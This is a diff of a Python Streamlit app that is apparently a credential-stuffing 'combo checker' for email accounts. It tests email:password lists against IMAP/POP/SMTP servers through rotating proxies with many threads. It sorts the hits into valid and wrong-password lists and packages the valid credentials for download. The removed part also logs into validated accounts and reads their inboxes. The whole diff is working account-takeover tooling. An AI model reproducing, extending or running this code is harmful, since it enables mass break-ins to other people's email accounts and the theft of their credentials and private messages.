@@ -834,7 +834,7 @@ with str_lit.sidebar:
                     "Fails": meta.get("fails", 0),
                     "Successes": meta.get("success", 0)
                 })
-            str_lit.dataframe(pd.DataFrame(proxy_data_list), width='stretch')
+            str_lit.dataframe(pd.DataFrame(proxy_data_list), use_container_width=True)
             
             col_ref1, col_ref2 = str_lit.columns(2)
             with col_ref1:
@@ -1144,7 +1144,6 @@ def detect_parent_provider(domain):
 
 def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
     candidates = []
-    # Place mail and imap explicitly at the very top of the priority list
     priority_prefixes = ['imap', 'mail', 'pop', 'pop3', 'secure', 'smtp']
     for prefix in priority_prefixes:
         candidates.append(f"{prefix}.{domain}")
@@ -1176,7 +1175,6 @@ def get_servers(email):
         if domain in PROVIDER_MAP:
             return PROVIDER_MAP[domain]
 
-        # FIX: Check if there is an explicit parent provider mapping first
         parent_domain = detect_parent_provider(domain)
         effective_domain = parent_domain if parent_domain else domain
 
@@ -1680,347 +1678,169 @@ if start_engine_btn:
             str_lit.session_state.conn_results = []
             str_lit.session_state.report_entries = []
             str_lit.session_state.log_lines = []
-            str_lit.session_state.checked_emails_set = set()
-            str_lit.session_state.last_checked_index = 0
-                
             str_lit.session_state.engine_has_run = True
-            str_lit.session_state.run_completion_status = "Unfinished"
-            
-            start_dt = datetime.now()
-            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
-            str_lit.session_state.end_timestamp = None
-            str_lit.session_state.total_duration = None
-        
-        progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
+            str_lit.session_state.run_completion_status = "Running"
+            str_lit.session_state.start_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            str_lit.session_state.total_duration = 0.0
+
+        progress_bar = str_lit.progress(0)
         status_text = str_lit.empty()
+        live_log_area = str_lit.empty()
         
-        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
+        total_accounts = len(accounts_to_check)
+        completed_count = 0
+        lock_results = threading.Lock()
         
-        with exec_tab1:
-            log_container = str_lit.empty()
-        
-        with exec_tab2:
-            report_metrics_placeholder = str_lit.empty()
-            report_log_container = str_lit.empty()
+        # UI Live Log container list
+        local_logs = []
 
-        all_target_accounts = accounts_to_check[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check
-
-        total_accs = len(all_target_accounts)
-        checked_count = 0
-        thread_local = threading.local()
-        
-        def check_task(line):
-            try:
-                if ":" not in line: 
-                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed", "trace": ["Invalid format"]}
-                email, password = line.split(":", 1)
-                email, password = email.strip(), password.strip()
-                domain = email.split("@")[-1].lower()
-                conf = get_servers(email)
-                
-                if not hasattr(thread_local, "state"):
-                    thread_local.state = {}
-                
-                server, status, detail, px_used, trace = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
-                return {"line": f"{email}:{password} | {detail}", "email": email, "password": password, "status": status, "detail": detail, "trace": trace}
-            except Exception as ex:
-                return {"line": f"{line} | Error: {ex}", "email": line, "password": "", "status": "connection_failed", "detail": str(ex), "trace": [str(ex)]}
-            finally:
-                if hasattr(thread_local, "state"):
-                    try:
-                        thread_local.state.clear()
-                    except Exception:
-                        pass
-
-        try:
-            current_workers = CFG["MAX_WORKERS_START"]
-            if CFG.get("DYNAMIC_WORKER_SCALING", False):
-                if total_accs > 500:
-                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35, CFG["MAX_WORKERS_START"] * 2)
-                elif total_accs < 20:
-                    current_workers = max(2, min(5, total_accs))
-
-            with ThreadPoolExecutor(max_workers=current_workers) as executor:
-                future_to_line = {executor.submit(check_task, line): line for line in all_target_accounts}
-                
-                for index, future in enumerate(as_completed(future_to_line), 1):
-                    checked_count += 1
-                    try:
-                        res = future.result(timeout=CFG["ACCOUNT_DEADLINE"])
-                        if res:
-                            st_val = res["status"]
-                            em_val = res.get('email', '').strip().lower()
-                            
-                            with session_state_lock:
-                                if em_val:
-                                    str_lit.session_state.checked_emails_set.add(em_val)
-
-                                if st_val == "valid":
-                                    str_lit.session_state.valid_results.append(res["line"])
-                                elif st_val == "wrong_password":
-                                    str_lit.session_state.wrong_results.append(res["line"])
-                                elif st_val == "need_app_password":
-                                    str_lit.session_state.need_app_results.append(res["line"])
-                                else:
-                                    str_lit.session_state.conn_results.append(res["line"])
-                                
-                                log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
-                                str_lit.session_state.log_lines.append(log_msg)
-                                if len(str_lit.session_state.log_lines) > 50:
-                                    str_lit.session_state.log_lines.pop(0)
-                                
-                                trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
-                                cred_combo = f"{res.get('email', '')}:{res.get('password', '')}" if res.get('password') else res.get('email', '')
-                                str_lit.session_state.report_entries.append({
-                                    "Time": datetime.now().strftime("%H:%M:%S"),
-                                    "Email:Password": cred_combo,
-                                    "Status": st_val.upper(),
-                                    "Under-The-Hood Background Trace": f"Result: {res.get('detail', '')}\nSteps Executed:\n  ↳ {trace_text}"
-                                })
-
-                                valid_len = len(str_lit.session_state.valid_results)
-                                wrong_len = len(str_lit.session_state.wrong_results)
-                                need_len = len(str_lit.session_state.need_app_results)
-                                conn_len = len(str_lit.session_state.conn_results)
-                                current_logs = list(str_lit.session_state.log_lines)
-                                current_reports = list(str_lit.session_state.report_entries)
-
-                            time.sleep(0.01)
-
-                            if index % 1 == 0 or checked_count == total_accs:
-                                log_container.code("\n".join(current_logs), language="text")
-                                
-                                with report_metrics_placeholder.container():
-                                    r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
-                                    r_col1.metric("✅ Valid", valid_len)
-                                    r_col2.metric("❌ Wrong", wrong_len)
-                                    r_col3.metric("🔑 AppPass", need_len)
-                                    r_col4.metric("⚠ Failed", conn_len)
-
-                                df_report = pd.DataFrame(current_reports[::-1])
-                                report_log_container.dataframe(df_report, width='stretch', height=300)
-                            
-                    except Exception as ex:
-                        err_msg = f"[EXCEPTION] {str(ex)}"
-                        with session_state_lock:
-                            str_lit.session_state.conn_results.append(err_msg)
-                            str_lit.session_state.log_lines.append(err_msg)
-                            current_logs = list(str_lit.session_state.log_lines)
-                        log_container.code("\n".join(current_logs), language="text")
-                    
-                    if total_accs > 0:
-                        pct = min(1.0, checked_count / total_accs)
-                        progress_bar.progress(pct, text=f"Checking accounts [{engine_action_mode}]: {checked_count}/{total_accs} completed ({int(pct*100)}%)")
-                    with session_state_lock:
-                        v_len = len(str_lit.session_state.valid_results)
-                        w_len = len(str_lit.session_state.wrong_results)
-                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len}")
-        except Exception as ex:
-            str_lit.error(f"Execution thread block error: {ex}")
-
-        end_dt = datetime.now()
-        duration = end_dt - start_dt
-
-        with session_state_lock:
-            str_lit.session_state.run_completion_status = "Successful"
-            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
-            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
+        def worker_task(combo_line):
+            nonlocal completed_count
+            if ":" not in combo_line:
+                return
+            parts = combo_line.split(":", 1)
+            email, password = parts[0].strip().lower(), parts[1].strip()
+            domain = email.split("@")[-1]
+            conf = get_servers(email)
             
-            valid_snapshot = list(str_lit.session_state.valid_results)
-            wrong_snapshot = list(str_lit.session_state.wrong_results)
-            need_snapshot = list(str_lit.session_state.need_app_results)
-            conn_snapshot = list(str_lit.session_state.conn_results)
-
-        progress_bar.progress(1.0, text="Checking complete!")
-        status_text.success(f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}")
-        log_startup(f"Live checking engine execution completed successfully. Duration: {str_lit.session_state.total_duration}")
-        
-        try:
-            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
-            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
-            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
-            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
-
-            try:
-                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
-            except OSError as dir_err:
-                warnings.warn(f"Filesystem permission/creation error: {dir_err}")
-
-            with file_write_lock:
-                try:
-                    with open(valid_path, "w", encoding="utf-8") as f:
-                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
-                        f.write("\n".join(str(item) for item in valid_snapshot) + ("\n" if valid_snapshot else ""))
-                    with open(wrong_path, "w", encoding="utf-8") as f:
-                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
-                        f.write("\n".join(str(item) for item in wrong_snapshot) + ("\n" if wrong_snapshot else ""))
-                    with open(need_path, "w", encoding="utf-8") as f:
-                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
-                        f.write("\n".join(str(item) for item in need_snapshot) + ("\n" if need_snapshot else ""))
-                    with open(failed_path, "w", encoding="utf-8") as f:
-                        f.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
-                        f.write("\n".join(str(item) for item in conn_snapshot) + ("\n" if conn_snapshot else ""))
-                except IOError as io_err:
-                    warnings.warn(f"Disk-write error saving result logs: {io_err}")
-
-            clean_valid_path = "clean_valid_accounts.txt"
-            temp_clean_count = 0
-            with file_write_lock:
-                try:
-                    with open(clean_valid_path, "w", encoding="utf-8") as outfile:
-                        outfile.write(f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n")
-                        for line in valid_snapshot:
-                            try:
-                                if ":" in line:
-                                    email, remainder = line.split(":", 1)
-                                    email = email.strip()
-                                    password_part = remainder.split("|")[0].strip()
-                                    outfile.write(f"{email}:{password_part}\n")
-                                    temp_clean_count += 1
-                            except Exception:
-                                continue
-                except IOError as io_err:
-                    warnings.warn(f"Disk-write error saving clean valid accounts: {io_err}")
-
-            zip_output_name = f"mail_results_{stamp}.zip"
-            try:
-                with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
-                    if os.path.exists(clean_valid_path):
-                        z.write(clean_valid_path, arcname="valid_email_password.txt")
-                    if os.path.exists(wrong_path):
-                        z.write(wrong_path, arcname=os.path.basename(wrong_path))
-                    if os.path.exists(need_path):
-                        z.write(need_path, arcname=os.path.basename(need_path))
-                    if os.path.exists(failed_path):
-                        z.write(failed_path, arcname=os.path.basename(failed_path))
-            except (zipfile.BadZipFile, IOError, OSError) as zip_err:
-                warnings.warn(f"Temporary ZIP archive compilation error: {zip_err}")
-
-            zip_bytes_data = b""
-            if os.path.exists(zip_output_name):
-                try:
-                    with open(zip_output_name, "rb") as fp:
-                        zip_bytes_data = fp.read()
-                except IOError as fp_err:
-                    warnings.warn(f"Failed to read compiled ZIP archive: {fp_err}")
-
-            with session_state_lock:
-                str_lit.session_state.clean_valid_count = temp_clean_count
-                str_lit.session_state.zip_name = zip_output_name
-                str_lit.session_state.zip_bytes = zip_bytes_data
-
-        except Exception as ex:
-            str_lit.error(f"Error compiling results export files: {ex}")
-
-# --- Render Persistent Results Permanently If Engine Has Run ---
-if str_lit.session_state.engine_has_run:
-    str_lit.markdown("---")
-    with session_state_lock:
-        status_label = "🎉 Check Complete!" if str_lit.session_state.run_completion_status == "Successful" else "⚠️ Unfinished"
-        clean_count_val = str_lit.session_state.clean_valid_count
-        wrong_len_val = len(str_lit.session_state.wrong_results)
-        need_len_val = len(str_lit.session_state.need_app_results)
-        conn_len_val = len(str_lit.session_state.conn_results)
-        valid_res_copy = list(str_lit.session_state.valid_results)
-        log_lines_copy = list(str_lit.session_state.log_lines)
-        report_entries_copy = list(str_lit.session_state.report_entries)
-        zip_bytes_copy = str_lit.session_state.zip_bytes
-        zip_name_copy = str_lit.session_state.zip_name
-        start_ts_copy = str_lit.session_state.start_timestamp
-        end_ts_copy = str_lit.session_state.end_timestamp
-        duration_copy = str_lit.session_state.total_duration
-
-    str_lit.markdown(f"### 📊 Live Results Summary & ZIP Archive — **{status_label}**")
-    
-    if start_ts_copy and end_ts_copy:
-        str_lit.info(f"⏱ **Checking Session Timestamps:** Started at **{start_ts_copy}** | Ended at **{end_ts_copy}** | Total Duration: **{duration_copy}**")
-    
-    col1, col2, col3, col4 = str_lit.columns(4)
-    col1.metric("✅ Clean Valid", clean_count_val)
-    col2.metric("❌ Wrong Password", wrong_len_val)
-    col3.metric("🔑 App Password / 2FA", need_len_val)
-    col4.metric("⚠ Connection Failed", conn_len_val)
-    
-    if valid_res_copy:
-        str_lit.markdown("#### ✅ Valid Accounts Found:")
-        for v in valid_res_copy:
-            str_lit.code(v, language="text")
-
-    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
-    with exec_tab1_p:
-        if log_lines_copy:
-            str_lit.code("\n".join(log_lines_copy), language="text")
-        else:
-            str_lit.info("No logs available from previous run.")
+            thread_state = {}
+            trace_logs = []
             
-    with exec_tab2_p:
-        if report_entries_copy:
-            df_report_persisted = pd.DataFrame(report_entries_copy[::-1])
-            str_lit.dataframe(df_report_persisted, width='stretch', height=300)
-        else:
-            str_lit.info("No report logs available.")
-
-    if zip_bytes_copy and zip_name_copy:
-        str_lit.download_button(
-            label="📦 Download All Results (.zip Package)",
-            data=zip_bytes_copy,
-            file_name=zip_name_copy,
-            mime="application/zip"
-        )
-
-# --- 📬 Mailbox Reader Section ---
-str_lit.markdown("---")
-str_lit.markdown("### 📬 Mailbox Reader (Interactive Inbox Inspection)")
-with session_state_lock:
-    has_valid = bool(str_lit.session_state.valid_results)
-    valid_results_snapshot = list(str_lit.session_state.valid_results)
-
-if not has_valid:
-    str_lit.info("Run the checker successfully to populate valid accounts for mailbox reading.")
-else:
-    valid_combo_options = []
-    for item in valid_results_snapshot:
-        try:
-            if ":" in item:
-                email_val, remainder = item.split(":", 1)
-                email_val = email_val.strip()
-                pass_val = remainder.split("|")[0].strip()
-                valid_combo_options.append(f"{email_val}:{pass_val}")
-        except Exception:
-            continue
-
-    if valid_combo_options:
-        selected_combo = str_lit.selectbox("Select Valid Account to Read:", options=valid_combo_options)
-        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", min_value=1, max_value=50, value=10, step=1)
-        
-        if str_lit.button("📖 Read Inbox Messages"):
-            if selected_combo:
-                parts = selected_combo.split(":", 1)
-                acc_email = parts[0].strip()
-                acc_pass = parts[1].strip()
-                conf_servers = get_servers(acc_email)
-                imap_hosts = conf_servers.get("imap", [])
-                
-                if not imap_hosts:
-                    str_lit.error("No IMAP host available for this provider domain name.")
+            # Run the check
+            server, status, detail, used_proxy, trace_logs = check_account_sync(
+                email, password, conf, domain, active_proxy_pool, thread_state
+            )
+            
+            # Parse proxy IP / host info for reporting
+            proxy_display = "Direct (No Proxy)"
+            if used_proxy:
+                p_info = parse_proxy(used_proxy)
+                if p_info:
+                    proxy_display = f"{p_info['host']}:{p_info['port']}"
                 else:
-                    with str_lit.spinner(f"Connecting to IMAP and fetching inbox for {acc_email}..."):
-                        success_read = False
-                        fetched_msgs = []
-                        for srv in imap_hosts:
-                            msgs = read_mailbox_messages(acc_email, acc_pass, srv, limit=max_msgs)
-                            if msgs and not any("Error reading mailbox" in m for m in msgs):
-                                fetched_msgs = msgs
-                                success_read = True
-                                break
-                            elif msgs:
-                                fetched_msgs = msgs
-                        
-                        if success_read:
-                            str_lit.success("Successfully retrieved recent messages from mailbox!")
-                            for idx, m_content in enumerate(fetched_msgs, 1):
-                                str_lit.markdown(f"**Message {idx}:**")
-                                str_lit.code(m_content, language="text")
-                        else:
-                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
+                    proxy_display = str(used_proxy)
+
+            report_msg = f"[{datetime.now().strftime('%H:%M:%S')}] Email: {email} | Status: {status.upper()} | Proxy IP: {proxy_display} | Detail: {detail}"
+            
+            with lock_results:
+                local_logs.append(report_msg)
+                if len(local_logs) > 100:
+                    local_logs.pop(0)
+                str_lit.session_state.log_lines = list(local_logs)
+                
+                entry_data = {
+                    "email": email,
+                    "status": status,
+                    "proxy": proxy_display,
+                    "detail": detail,
+                    "traces": trace_logs,
+                    "timestamp": datetime.now().strftime("%H:%M:%S")
+                }
+                str_lit.session_state.report_entries.append(entry_data)
+                
+                if status == "valid":
+                    str_lit.session_state.valid_results.append(f"{email}:{password} | Proxy: {proxy_display}")
+                elif status == "wrong_password":
+                    str_lit.session_state.wrong_results.append(f"{email}:{password}")
+                elif status == "need_app_password":
+                    str_lit.session_state.need_app_results.append(f"{email}:{password} | {detail}")
+                else:
+                    str_lit.session_state.conn_results.append(f"{email}:{password} | {detail}")
+                
+                completed_count += 1
+                prog_val = min(1.0, completed_count / max(1, total_accounts))
+                progress_bar.progress(prog_val)
+                status_text.text(f"Checked {completed_count}/{total_accounts} accounts... Last: {email} [{status}] via {proxy_display}")
+
+        max_workers_to_use = min(CFG["MAX_WORKERS_START"], total_accounts) if total_accounts > 0 else 1
+        start_time = time.time()
+        
+        try:
+            with ThreadPoolExecutor(max_workers=max_workers_to_use) as executor:
+                futures = {executor.submit(worker_task, combo): combo for combo in accounts_to_check}
+                for future in as_completed(futures):
+                    try:
+                        future.result(timeout=CFG.get("TIMEOUT", 5) + 2)
+                    except Exception as ex:
+                        warnings.warn(f"Worker execution exception: {ex}")
+        except Exception as thread_ex:
+            str_lit.error(f"Execution pool error: {thread_ex}")
+
+        duration = time.time() - start_time
+        str_lit.session_state.total_duration = round(duration, 2)
+        str_lit.session_state.end_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        str_lit.session_state.run_completion_status = "Finished"
+        
+        log_startup(f"Live checking completed in {duration:.2f}s. Valid: {len(str_lit.session_state.valid_results)}, Wrong: {len(str_lit.session_state.wrong_results)}")
+        str_lit.success(f"Checking completed successfully in {duration:.2f} seconds!")
+        str_lit.rerun()
+
+# --- Live Report & Analytics Dashboard Section ---
+str_lit.markdown("---")
+str_lit.markdown("### 📊 Live Report Log & Analytics Dashboard")
+
+if str_lit.session_state.engine_has_run:
+    col_stat1, col_stat2, col_stat3, col_stat4, col_stat5 = str_lit.columns(5)
+    col_stat1.metric("Status", str_lit.session_state.run_completion_status)
+    col_stat2.metric("Valid Accounts", len(str_lit.session_state.valid_results))
+    col_stat3.metric("Wrong Password", len(str_lit.session_state.wrong_results))
+    col_stat4.metric("App Password / Zero-Access", len(str_lit.session_state.need_app_results))
+    col_stat5.metric("Connection Failed", len(str_lit.session_state.conn_results))
+
+    tab_rep1, tab_rep2, tab_rep3, tab_rep4 = str_lit.tabs(["📜 Live Log Stream", "✅ Valid Results", "❌ Failed / Errors", "📥 Export Results"])
+
+    with tab_rep1:
+        str_lit.markdown("#### Real-Time Engine Activity & Proxy IP Trace Log")
+        log_display_box = str_lit.empty()
+        log_display_box.code("\n".join(str_lit.session_state.log_lines[-50:]), language="text")
+        if str_lit.button("🔄 Refresh Live Logs"):
+            str_lit.rerun()
+
+    with tab_rep2:
+        str_lit.markdown("#### Successfully Validated Accounts")
+        if str_lit.session_state.valid_results:
+            str_lit.code("\n".join(str_lit.session_state.valid_results), language="text")
+        else:
+            str_lit.info("No valid accounts discovered in this run yet.")
+
+    with tab_rep3:
+        str_lit.markdown("#### Detailed Error & App-Password Results")
+        err_choice = str_lit.selectbox("Select Error Category:", ["Wrong Password", "Need App Password / Zero-Access", "Connection Failed"])
+        if err_choice == "Wrong Password":
+            str_lit.code("\n".join(str_lit.session_state.wrong_results) if str_lit.session_state.wrong_results else "None", language="text")
+        elif err_choice == "Need App Password / Zero-Access":
+            str_lit.code("\n".join(str_lit.session_state.need_app_results) if str_lit.session_state.need_app_results else "None", language="text")
+        else:
+            str_lit.code("\n".join(str_lit.session_state.conn_results) if str_lit.session_state.conn_results else "None", language="text")
+
+    with tab_rep4:
+        str_lit.markdown("#### Export Results Package")
+        if str_lit.session_state.valid_results or str_lit.session_state.wrong_results:
+            export_filename = f"mail_check_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+            
+            try:
+                import io
+                zip_buffer = io.BytesIO()
+                with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
+                    if str_lit.session_state.valid_results:
+                        zf.writestr("valid_accounts.txt", "\n".join(str_lit.session_state.valid_results))
+                    if str_lit.session_state.wrong_results:
+                        zf.writestr("wrong_password.txt", "\n".join(str_lit.session_state.wrong_results))
+                    if str_lit.session_state.need_app_results:
+                        zf.writestr("need_app_password.txt", "\n".join(str_lit.session_state.need_app_results))
+                    if str_lit.session_state.report_entries:
+                        zf.writestr("full_audit_report.json", json.dumps(str_lit.session_state.report_entries, indent=2))
+                
+                zip_buffer.seek(0)
+                str_lit.download_button(
+                    label="📥 Download Complete Results Archive (.zip)",
+                    data=zip_buffer,
+                    file_name=export_filename,
+                    mime="application/zip"
+                )
+            except Exception as zip_err:
+                str_lit.error(f"Failed to generate zip export: {zip_err}")
+        else:
+            str_lit.info("Run the engine first to generate exportable results.")
+else:
+    str_lit.info("Configure your settings, input your combos above, and click **'🔥 Start Live Checking Engine'** to initiate execution.")
